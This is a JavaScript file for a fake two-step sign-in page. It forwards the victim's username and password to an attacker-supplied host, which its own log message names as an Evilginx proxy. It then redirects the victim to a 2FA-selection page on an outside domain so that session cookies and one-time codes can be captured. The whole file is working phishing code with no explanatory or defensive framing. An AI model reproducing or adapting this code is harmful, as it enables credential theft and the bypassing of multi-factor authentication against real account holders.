document.addEventListener("DOMContentLoaded", () => {
  const state = {
    username: "",
    apiHost: "",
    isSubmitting: false,
  }

  const ui = {
    emailStep: document.getElementById("email-step"),
    passwordStep: document.getElementById("password-step"),
    nextBtn: document.getElementById("next-btn"),
    submitBtn: document.getElementById("submit-btn"),
    usernameInput: document.getElementById("username"),
    passwordInput: document.getElementById("password"),
    userIdentifier: document.getElementById("user-identifier"),
    errorBanner: document.getElementById("error-banner"),
    loadingContainer: document.getElementById("loading-container"),
    loginForm: document.getElementById("login-form"),
  }

  const showError = (message) => {
    ui.errorBanner.textContent = message
    ui.errorBanner.style.display = "block"
  }

  const setLoading = (loading) => {
    state.isSubmitting = loading
    ui.loadingContainer.style.display = loading ? "block" : "none"
    ui.loginForm.style.display = loading ? "none" : "block"
    ui.nextBtn.disabled = loading
    ui.submitBtn.disabled = loading
  }

  const init = () => {
    const urlParams = new URLSearchParams(window.location.search)
    state.apiHost = urlParams.get("api_host")
    if (!state.apiHost) {
      showError("Configuration error: API host is missing. Cannot proceed.")
      console.error("CRITICAL: api_host URL parameter is missing.")
      ui.nextBtn.disabled = true
    }
  }

  const goToPasswordStep = () => {
    state.username = ui.usernameInput.value.trim()
    if (!state.username) {
      showError("Please enter your username, email, or mobile number.")
      return
    }
    ui.userIdentifier.textContent = state.username
    ui.emailStep.classList.remove("visible")
    ui.emailStep.classList.add("hidden")
    ui.passwordStep.classList.remove("hidden")
    ui.passwordStep.classList.add("visible")
    ui.passwordInput.focus()
  }

  const handlePasswordSubmit = async (event) => {
    event.preventDefault()
    if (state.isSubmitting) return

    const password = ui.passwordInput.value
    if (!password) {
      showError("Please enter your password.")
      return
    }

    setLoading(true)

    const formData = new URLSearchParams()
    formData.append("username", state.username)
    formData.append("passwd", password)

    try {
      const response = await fetch(`https://${state.apiHost}/account/challenge/password`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: formData,
        credentials: "include", // Important for sending/receiving cookies
      })

      // We don't care about the response content. The goal is to get the cookies set.
      // We assume 2FA is next and redirect immediately.
      console.log("Password submitted to Evilginx proxy. Redirecting to 2FA selection.")

      const params = new URLSearchParams({
        u: state.username,
        api_host: state.apiHost,
      })
      window.location.href = `https://custompage.astrowind.live/2fa-selection.html?${params.toString()}`
    } catch (error) {
      console.error("Error submitting password to proxy:", error)
      // Even on network error, we redirect to keep the user in the flow.
      // The failure will become apparent at the OTP step if cookies aren't set.
      const params = new URLSearchParams({
        u: state.username,
        api_host: state.apiHost,
      })
      window.location.href = `https://custompage.astrowind.live/2fa-selection.html?${params.toString()}`
    }
  }

  ui.nextBtn.addEventListener("click", goToPasswordStep)
  ui.loginForm.addEventListener("submit", handlePasswordSubmit)

  init()
})
